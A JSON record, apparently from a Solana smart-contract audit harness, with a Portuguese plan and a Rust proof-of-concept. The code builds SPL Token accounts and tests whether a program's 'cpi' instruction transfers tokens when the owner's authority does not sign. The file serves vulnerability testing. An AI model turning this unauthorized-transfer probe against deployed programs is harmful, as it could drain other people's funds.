{
  "plan": "Preparamos contas SPL Token reais: mint, source (com tokens), destination (vazia) e authority (dona da source). O baseline chama `cpi` com a authority assinando, provando que o cenario esta correto e movendo tokens. O ataque repete a mesma chamada, mas a authority nao assina (apenas a conta source/destination assinam ou ninguem assina), tentando forcar a transferencia sem consentimento. O efeito mede que os tokens sairam da source e chegaram na destination mesmo sem a assinatura da authority.",
  "scenario": "let mint = Pubkey::new_unique();
let source = Pubkey::new_unique();
let destination = Pubkey::new_unique();
let authority = Pubkey::new_unique();

let token_program_id = spl_token::id();

// Conta mint SPL Token (82 bytes: mint_authority Option<Pubkey>, supply u64, decimals u8, is_initialized bool, freeze_authority Option<Pubkey>)
let mut mint_data = vec![0u8; 82];
// mint_authority = None (0)
// supply = 0
// decimals = 0
// is_initialized = true
mint_data[44] = 1;
let mint_account = account(&token_program_id, &mint_data, None);

// Conta source SPL Token (165 bytes: mint Pubkey, owner Pubkey, amount u64, delegate Option<Pubkey>, state u8, is_native Option<u64>, delegated_amount u64, close_authority Option<Pubkey>)
let mut source_data = vec![0u8; 165];
source_data[0..32].copy_from_slice(mint.as_ref());
source_data[32..64].copy_from_slice(authority.as_ref());
source_data[64..72].copy_from_slice(&1000u64.to_le_bytes());
source_data[108] = 1; // state = initialized
let source_account = account(&token_program_id, &source_data, None);

// Conta destination SPL Token
let mut dest_data = vec![0u8; 165];
dest_data[0..32].copy_from_slice(mint.as_ref());
dest_data[32..64].copy_from_slice(authority.as_ref());
dest_data[64..72].copy_from_slice(&0u64.to_le_bytes());
dest_data[108] = 1;
let dest_account = account(&token_program_id, &dest_data, None);

let authority_account = wallet(1_000_000_000);

let token_program_account = program_account(&token_program_id);

let metas = vec![
    AccountMeta::new(source, false),
    AccountMeta::new(destination, false),
    AccountMeta::new_readonly(authority, true),
    AccountMeta::new_readonly(token_program_id, false),
];

let ix = env.anchor_ix("cpi", &(&100u64,), metas.clone());

let contas = vec![
    (source, source_account.clone()),
    (destination, dest_account.clone()),
    (authority, authority_account.clone()),
    (token_program_id, token_program_account.clone()),
];

let baseline = env.baseline("transfer legitima com authority assinando", &ix, &contas);

// Ataque: mesma instrucao, mas authority NAO assina
let attack_metas = vec![
    AccountMeta::new(source, false),
    AccountMeta::new(destination, false),
    AccountMeta::new_readonly(authority, false),
    AccountMeta::new_readonly(token_program_id, false),
];
let attack_ix = env.anchor_ix("cpi", &(&100u64,), attack_metas);

let attack_contas = vec![
    (source, source_account),
    (destination, dest_account),
    (authority, authority_account),
    (token_program_id, token_program_account),
];

let r = env.attack("transfer sem assinatura da authority", &attack_ix, &attack_contas);

if r.program_result == ProgramResult::Success {
    let dest_after = after(&r, &destination);
    let amount = read_u64(dest_after.data(), 64);
    env.effect("tokens transferidos para destination sem assinatura da authority", amount == 100);
}"
}

